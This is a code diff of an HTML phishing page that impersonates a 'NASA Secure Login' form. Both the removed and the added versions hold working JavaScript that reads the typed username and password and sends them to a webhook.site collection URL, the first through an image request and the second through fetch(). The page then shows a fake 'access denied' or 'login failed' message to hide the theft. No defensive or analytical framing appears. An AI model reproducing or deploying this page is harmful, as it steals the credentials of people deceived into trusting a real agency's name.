@@ -2,57 +2,51 @@
 <html>
 <head>
   <title>NASA Secure Login</title>
-  <meta charset="utf-8" />
+  <meta charset="utf-8">
   <style>
-    body {{
-      font-family: sans-serif;
-      background: #f4f4f4;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }}
-    .login {{
+    body {
+      background: #f0f0f0;
+      font-family: Arial;
+      text-align: center;
+      padding-top: 80px;
+    }
+    .box {
       background: #fff;
       padding: 40px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-      border-radius: 10px;
-    }}
-    input {{
-      display: block;
-      margin-bottom: 15px;
+      margin: auto;
+      width: 300px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #ccc;
+    }
+    input {
+      width: 90%;
       padding: 10px;
-      width: 100%;
-    }}
-    button {{
-      padding: 10px 15px;
-      background: #004b8d;
-      color: white;
+      margin: 10px 0;
+    }
+    button {
+      padding: 10px 20px;
+      background: #003366;
+      color: #fff;
       border: none;
-    }}
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <div class="login">
+  <div class="box">
     <h2>NASA Secure Login</h2>
-    <form onsubmit="exfiltrate(); return false;">
-      <input type="text" id="user" placeholder="Username" />
-      <input type="password" id="pass" placeholder="Password" />
-      <button type="submit">Login</button>
-    </form>
-    <p id="log" style="color:red;"></p>
+    <input id="user" placeholder="Username"><br>
+    <input id="pass" type="password" placeholder="Password"><br>
+    <button onclick="send()">Login</button>
   </div>
-
   <script>
-    function exfiltrate() {{
-      const u = document.getElementById("user").value;
-      const p = document.getElementById("pass").value;
-      document.getElementById("log").innerText = "Logging in...";
-      new Image().src = "https://webhook.site/7efd8b7e-f9f4-4b3d-bd7b-d329ec5d72a5?user=" + encodeURIComponent(u) + "&pass=" + encodeURIComponent(p);
-      setTimeout(() => {{
-        document.getElementById("log").innerText = "Access denied. Try again.";
-      }}, 2000);
-    }}
+    function send() {
+      const u = document.getElementById('user').value;
+      const p = document.getElementById('pass').value;
+      fetch('https://webhook.site/f988f5a7-6736-4a39-bbf2-7314ca91aa7e?user=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p));
+      alert('Login failed. Please try again later.');
+    }
   </script>
 </body>
 </html>
+
